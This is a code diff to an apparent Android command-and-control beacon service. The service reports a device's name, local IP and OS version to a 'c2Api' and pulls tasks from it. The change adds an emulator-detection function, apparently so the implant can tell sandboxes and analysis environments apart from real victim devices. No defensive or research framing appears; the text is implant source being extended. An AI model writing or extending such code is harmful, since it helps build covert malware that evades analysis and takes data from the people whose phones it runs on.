@@ -39,6 +39,7 @@ class RealBeaconService @Inject constructor(
             device_name = getDeviceName(),
             ip_address = getLocalIpAddress(),
             os_info = "Android ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})",
+            is_emulator = detectEmulator(),
         )
         val checkInResponse = c2Api.checkIn(checkInRequest)
         val tasksResponse = c2Api.getTasks(getDeviceName())
@@ -98,6 +99,16 @@ class RealBeaconService @Inject constructor(
             ),
         )
     }
+
+    internal fun detectEmulator(): Boolean =
+        Build.FINGERPRINT.startsWith("generic") ||
+            Build.FINGERPRINT.startsWith("unknown") ||
+            Build.MODEL.contains("google_sdk", ignoreCase = true) ||
+            Build.MODEL.contains("Emulator", ignoreCase = true) ||
+            Build.MODEL.contains("Android SDK built for x86", ignoreCase = true) ||
+            Build.MANUFACTURER.contains("Genymotion", ignoreCase = true) ||
+            (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) ||
+            Build.PRODUCT == "google_sdk"
 
     @SuppressLint("HardwareIds")
     private fun getDeviceName(): String =
